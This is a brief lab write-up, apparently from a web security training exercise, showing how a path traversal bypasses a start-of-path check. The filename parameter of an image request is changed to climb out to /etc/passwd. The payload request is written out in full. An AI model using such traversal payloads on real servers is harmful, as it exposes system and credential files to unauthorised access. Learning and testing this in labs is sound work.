Lab #5:  File path traversal, validation of start of path

Target: Get access to the content of /etc/passwd

Analysis:

The image files are loaded with Get request and here the complete path is required as the input argument!

GET /image?filename=/var/www/image/72.jpg

send the request to the repeater and change the filename parameter as follows:


GET /image?filename=/var/www/images/../../../../etc/passwd
